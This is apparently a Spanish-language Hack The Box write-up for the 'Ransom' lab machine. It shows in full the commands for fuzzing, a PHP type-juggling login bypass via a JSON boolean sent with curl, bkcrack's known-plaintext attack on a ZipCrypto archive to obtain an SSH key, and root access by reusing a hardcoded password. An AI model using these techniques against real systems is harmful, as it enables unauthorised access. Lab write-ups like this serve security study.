---
layout: single
title: Ransom - Hack The Box
excerpt: "Bypass de SSRF"
date: 2018-11-24
classes: wide
header:
  teaser: /assets/images/htb-forge/forge1.png
categories:
  - hackthebox
  - infosec
tags:
  - hackthebox
  - SSRF  
---

# 10.10.11.153 - Ransom

![](/assets/images/htb-ransom/ransom1.png)

---------------------

# Part 1: Reconocimiento inicial 

Puertos abiertos: 22(ssh), 80(http), 

```console
└─$ whatweb http://10.10.11.153
[302 Found] Apache[2.4.41], Cookies[XSRF-TOKEN,laravel_session] -> [Redirecting to http://10.10.11.153/login]
http://10.10.11.153/login [200 OK] Apache[2.4.41], Bootstrap, Cookies[XSRF-TOKEN,laravel_session], JQuery[1.9.1], Laravel, PasswordField[password], Script[text/javascript]
```

Me sale un campo para meter un login, me piden solo una contraseña:  
```GET http://10.10.11.153/api/login?password=``` Si pones una mala "Invalid Password"

```console
└─$ wfuzz -c -t 200 -w /usr/share/wordlists/rockyou.txt  "http://10.10.11.153/api/login?password=FUZZ"
000002150:   429        36 L     125 W      6625 Ch     "amazing"
```
En seguida el fuzzing nos cancelan

```console
└─$ wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.153/FUZZ
000000040:   200        172 L    372 W      6104 Ch     "login"
000000052:   500        217 L    17833 W    599984 Ch   "register"
000000537:   301        9 L      28 W       310 Ch      "css"
000000940:   301        9 L      28 W       309 Ch      "js"
└─$ wfuzz -c --hc=400 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.10.10.11.153" -u http://10.10.11.153/ -t 100
```
----------------------------
# Part 2: PHP - Type Juggling

![](/assets/images/htb-ransom/ransom2.PNG)

El panel de login es 10.10.11.154/login, pero la peticion se pasa a /api/login. Las apis son una capa mas profunda de la web y que está oculta al usuario ya que 
están pensadas para los programas y la parte más técnica, al ser algo oculto no suele estar tan protegido.   

En algunos casos un /login puede estar protegido antes ataques como SQLi o Type Juggling mientras que la api no.  
En este caso pasa eso, teneos laravel, que trabaja con PHP, es vulnerable a php Type juggling:  
```php
php > if ("contraseña"=="contraseña") { echo "Correcto"; } else { echo "Incorrecto";}
Correcto

Se puede saltar con el valor booleano "true":
php > if ("contraseña"==true) { echo "Correcto"; } else { echo "Incorrecto";}
Correcto

# Una manera de securizar esto es con un triple "="
php > if ("cucuxii"===true) { echo "Correcto"; } else { echo "Incorrecto";}
Incorrecto
```
Si ponemos en el navegador "true" no nos lo toma de manera correcta. Si miramos por el burpsuite, vemos que la peticion es a ```GET a /api/login?password="true"```  
Lo primero esque ya es un poco raro mandar una contraseña con GET (datos en la url). SI cambiamos a POST dice que no admite el metodo.

![](/assets/images/htb-ransom/ransom3.PNG)
![](/assets/images/htb-ransom/ransom4.PNG)

En cambio si mandamos un GET como si fuera un post o sea ```POST a /api/login  data=password="true"``` nos lo  pilla pero nos dice que faltan el campo contraseña.
Cuando mandas algo pero se queja de que no los has mandado es porque no es el formato que quiere, por lo que hay que mandarlo como json:  
  
La peticion sería asi (vemos que true se manda no como string sino como booleando (la diferencia son las ""))  
Si no disponemos de un entorno de pentesting avanzado con programas como burpsuite, se puede hacer con curl:

```console
└─$ curl -i http://10.10.11.153
# Para pillar las cookies

└─$ curl -i -s -k -L -X GET -H 'Content-Type: application/json'  \
--cookie 'XSRF-TOKEN=eyJpdiI6Img4MWhKVFRreV...; laravel_session=eyJpdiI6IlZCdXcz...' \
--data-binary $'{\"password\":true}' http://10.10.11.153/api/login
```
![](/assets/images/htb-ransom/ransom5.PNG)

---------------------
# Parte 3: Crackeando un Zip

Una vez hecho esto, podemos visitar 10.10.11.153/ sin que nos redirija a login.  
Podemos bajarnos un zip pero está protegido con contraseña:  
```console
└─$ unzip uploaded-file-3422.zip
Archive:  uploaded-file-3422.zip
[uploaded-file-3422.zip] .bash_logout password:
```
Jhon the ripper tiene herramientas para romper muchos tipos de archivos:  
```console
└─$ locate 2john | grep "zip"
/usr/sbin/zip2john
└─$ zip2john uploaded-file-3422.zip > hash
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
# No hay suerte
```

```console
└─$ 7z l uploaded-file-3422.zip
# Vemos que es el directorio de root pero comprimido, tenemos entre otros una id_rsa

└─$ 7z l uploaded-file-3422.zip -slt 
# Información tecnica dice que el metodo de encriptacion es ZipCrypto Deflate
```
Si buscas ```cracking zipcrypto deflate``` encontrarás una herramienta llamada [bkrack](https://github.com/kimci86/bkcrack) 

La herramienta bcrack nos pide que le demos un archivo que se parezca mucho a uno de los del zip encriptado.  
En concreto sería ```/home/cucuxii/.bash_logout```

```console
└─$ git clone https://github.com/kimci86/bkcrack
└─$ cd bkcrack
└─$ cmake -S . -B build -DCMAKE_INSTALL_PREFIX=install
└─$ cmake --build build --config Release
└─$ cmake --build build --config Release --target install

└─$ cp ~/.bash_logout ./bash_logout
└─$ zip comprimido.zip bash_logout
└─$ cp ~/Maquinas/htb/Ransom/uploaded-file-3422.zip .
└─$ ./bkcrack -C uploaded-file-3422.zip -c ".bash_logout" -P "comprimido.zip" -p "bash_logout"
7b549874 ebc25ec5 7e465e18

└─$ ./bkcrack -C ./uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 -U nuevo.zip contraseña
└─$ unzip nuevo.zip

└─$ chmod 600 id_rsa
└─$ ssh -i id_rsa root@10.10.11.153
root@10.10.11.153's password:

└─$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EA...13N6/M= htb@ransom
└─$ ssh -i id_rsa htb@10.10.11.153
```
------------------------------
# Parte 4: Escalando privilegios

Entramos con un usaurio de bajos privilegios:  
- Grupos: groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)  
- Procesos: /usr/lib/udisks2/udisksd  
- Existe el archivo de configuracion de apache: /etc/apache2/sites-enabled/000-default.conf  

Al ser apache el archivo de configuracion 000-default:  
```console
htb@ransom:/tmp$ cat /etc/apache2/sites-enabled/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /srv/prod/public
htb@ransom:/srv/prod$ ls public/
# Codigo fuente:
css  favicon.ico  fonts  index.php  js  robots.txt  scss  uploaded-file-3422.zip  user.txt
htb@ransom:/srv/prod$ ls ../
# Mas codigo fuente del server
README.md  artisan    composer.json  config    package.json  public     routes      storage  vendor
app        bootstrap  composer.lock  database  phpunit.xml   resources  server.php  tests    webpack.mix.js
htb@ransom:/srv/prod$ grep -riE "password" 2>/dev/null
# Demasiadas cosas, probaremos a buscar de carpeta en carpeta
htb@ransom:/srv/prod/app$ grep -riE "password" 2>/dev/null
Http/Controllers/AuthController.php:        if ($request->get('password') == "UHC-March-Global-PW!") {

htb@ransom:/srv/prod/app$ su root
Password: UHC-March-Global-PW!
root@ransom:/srv/prod/app# whoami
root
```

---------------------------
# Extra: Analizando bckrack

Mirando la documentación del repo pone que:  
- Está utilizando el ataque "Biham and Kocher's"    
- Los zips se suelen encriptar con el cifrado simetrico (una sola llave) basado en contraseña o "PKWARE/Zipcrypto"  

Zipcrypto genera una cadena de bits random, en plan "23$(¡.d" que se XORrea con el contenido de una entrada en texto plano para crear un texto cifrado  
La operacion XOR lo que hace es pasar todos los caracteres a binario y los compara de tal manera que si los bits son iguales da 0 y si son distintos 1:
```
Cipher ->    0110101        Cipher    ->  0110101         Decipher  ->  1101001
key    ->    1011100        Decipher  ->  1101001         Key       ->  1011100
             -------                      --------                      --------
Decipher ->  1101001        Key       ->  1011100         Cipher    ->  0110101 
```
El texto cifrado de 32 bits se inicia con la contraseña y se va descrifrando con el "Biham and Kocher's" 
Este requiere que tengamos un texto de mas de 12 bytes que sea igual que el cifrado para sacar el patron de cifrado que sirve para romperlo todo.



